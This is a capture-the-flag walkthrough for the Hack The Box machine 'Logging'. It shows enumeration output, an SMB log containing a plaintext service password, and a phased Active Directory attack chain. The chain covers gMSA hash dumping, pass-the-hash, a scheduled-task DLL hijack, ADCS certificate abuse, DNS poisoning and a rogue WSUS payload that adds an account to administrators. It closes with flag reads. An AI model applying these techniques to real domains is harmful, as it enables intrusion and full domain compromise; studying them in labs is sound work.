network enumeration:

```
53/tcp    open   domain         Simple DNS Plus  
80/tcp    open   http           Microsoft IIS httpd 10.0  
88/tcp    open   kerberos-sec   Microsoft Windows Kerberos (server time: 2026-04-19 02:02:49Z)  
135/tcp   open   msrpc          Microsoft Windows RPC  
139/tcp   open   netbios-ssn    Microsoft Windows netbios-ssn  
389/tcp   open   ldap           Microsoft Windows Active Directory LDAP (Domain: logging.htb., Site: Default-First-Site-Name)  
445/tcp   open   microsoft-ds  
464/tcp   open   kpasswd5  
593/tcp   open   ncacn_http     Microsoft Windows RPC over HTTP 1.0  
636/tcp   open   ldap           Microsoft Windows Active Directory LDAP (Domain: logging.htb., Site: Default-First-Site-Name)  
3268/tcp  open   ldap           Microsoft Windows Active Directory LDAP (Domain: logging.htb., Site: Default-First-Site-Name)  
3269/tcp  open   ldap           Microsoft Windows Active Directory LDAP (Domain: logging.htb., Site: Default-First-Site-Name)  
5985/tcp  open   http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```


```
ajdev@rootbox:~$ smbclient //logging.htb/Logs -U 'logging.htb\wallace.everette%Welcome2026@' \
  -c 'prompt OFF; mget *'
getting file \Audit_Heartbeat.log of size 1294 as Audit_Heartbeat.log (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \IdentitySync_Trace_20260219.log of size 8488 as IdentitySync_Trace_20260219.log (11.4 KiloBytes/sec) (average 4.9 KiloBytes/sec)
getting file \Service_State.log of size 468 as Service_State.log (0.5 KiloBytes/sec) (average 3.5 KiloBytes/sec)
getting file \TaskMonitor.log of size 1170 as TaskMonitor.log (1.6 KiloBytes/sec) (average 3.1 KiloBytes/sec)
```

`IdentitySync_Trace_20260219.log` contains a plaintext LDAP bind dump:

```
ConnectionContext Dump: {
  Domain: "logging.htb",
  Server: "DC01",
  SSL: "False",
  BindUser: "LOGGING\svc_recovery",
  BindPass: "Em3rg3ncyPa$$2025"
}
```


Here's a clean summary of the full attack chain for the **Logging** HTB machine:

---

### Logging — Full Attack Chain Summary

#### Phase 1 — Initial Access

- Started with credentials `wallace.everette:Welcome2026@`
- Enumerated SMB shares, found readable `Logs` share
- Downloaded `IdentitySync_Trace_20260219.log` which contained plaintext credentials for `svc_recovery:Em3rg3ncyPa$$2026` (password year was rotated from 2025 to 2026)

#### Phase 2 — Kerberos Authentication

- `svc_recovery` is in Protected Users so NTLM is blocked
- Used `faketime +7h` to handle clock skew with the DC
- Got a Kerberos TGT via `getTGT.py`

#### Phase 3 — gMSA Hash Dump

- `svc_recovery` has `GenericWrite` on the gMSA `msa_health$`
- Used `gMSADumper.py` to read the gMSA NT hash
- Hash: `603fc24ee01a9409f83c9d1d701485c5`

#### Phase 4 — WinRM Access

- `msa_health$` is in `Remote Management Users`
- Pass-the-Hash via `evil-winrm`

#### Phase 5 — DLL Hijack (User Flag)

- Discovered `UpdateChecker Agent` scheduled task runs every 3 minutes as `jaylee.clifton`
- Task loads `settings_update.dll` from a zip file we control
- Built a **32-bit** malicious DLL (must be 32-bit — host is `Prefer 32-bit` .NET)
- DLL submits a CSR to the `UpdateSrv` ADCS template as `jaylee.clifton`
- Uploaded `Settings_Update.zip` to `C:\ProgramData\UpdateMonitor\`
- Task executed our DLL → got `user.txt`

#### Phase 6 — ADCS Certificate

- `UpdateSrv` template has `ENROLLEE_SUPPLIES_SUBJECT` and `Server Authentication` EKU
- Only the `IT` group can enroll — `jaylee.clifton` is in IT
- DLL submitted our CSR for `wsus.logging.htb` signed by `logging-DC01-CA`
- Downloaded `cert.cer`, built PFX with our private key

#### Phase 7 — DNS Poisoning

- `msa_health$` has `SeMachineAccountPrivilege` → created machine account `attacker01$`
- Used `attacker01$` to add an A record `wsus.logging.htb → 10.10.15.133` via LDAP DNS
- DC now resolves `wsus.logging.htb` to our attacker machine

#### Phase 8 — Rogue WSUS Server

- Ran `wsuks` on ports 8530 (HTTP) and 8531 (HTTPS) with our trusted TLS cert
- Payload: `PsExec64.exe /s cmd.exe /c "net localgroup administrators msa_health$ /add"`
- Triggered Windows Update detection via `wuauclt` and `usoclient`
- DC connected to our rogue WSUS, downloaded and executed PsExec64 as SYSTEM

#### Phase 9 — Root

- SYSTEM ran our payload → `msa_health$` added to `BUILTIN\Administrators`
- Reconnected evil-winrm with full admin token
- Read `user.txt` from `jaylee.clifton`'s Desktop
- Read `root.txt` from `toby.brynleigh`'s Desktop (not Administrator — always check all user desktops)

```
ajdev@rootbox:~$ evil-winrm -i 10.129.36.82 -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\msa_health$\Documents> type C:\Users\jaylee.clifton\Desktop\user.txt
33e80e94f24ee875da789feb4729d41c
*Evil-WinRM* PS C:\Users\msa_health$\Documents> type C:\Users\toby.brynleigh\Desktop\root.txt
ebf23764f246a3bddb9d200c31b60bbc
```



